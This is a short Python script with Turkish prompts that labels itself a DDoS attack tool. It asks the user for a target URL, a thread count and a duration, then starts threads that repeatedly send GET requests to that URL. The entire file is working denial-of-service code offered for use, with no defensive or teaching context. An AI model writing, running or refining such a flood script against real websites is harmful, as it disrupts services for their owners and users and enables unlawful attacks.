import requests
import threading
import time

def ddos(target_url, threads, duration):
    print(f"{threads} tane thread ve {duration} saniye boyunca DDoS saldırısı yapılacak")

    for i in range(threads):
        thread = threading.Thread(target=attack, args=(target_url, duration))
        thread.start()

def attack(target_url, duration):
    start_time = time.time()

    while True:
        requests.get(target_url)

        if time.time() - start_time > duration:
            break

        time.sleep(1)

if __name__ == "__main__":
    target_url = input("Hedef URL'yi giriniz: ")
    threads = int(input("Thread sayısını giriniz: "))
    duration = int(input("Saldırı süresini giriniz (saniye): "))

    ddos(target_url, threads, duration)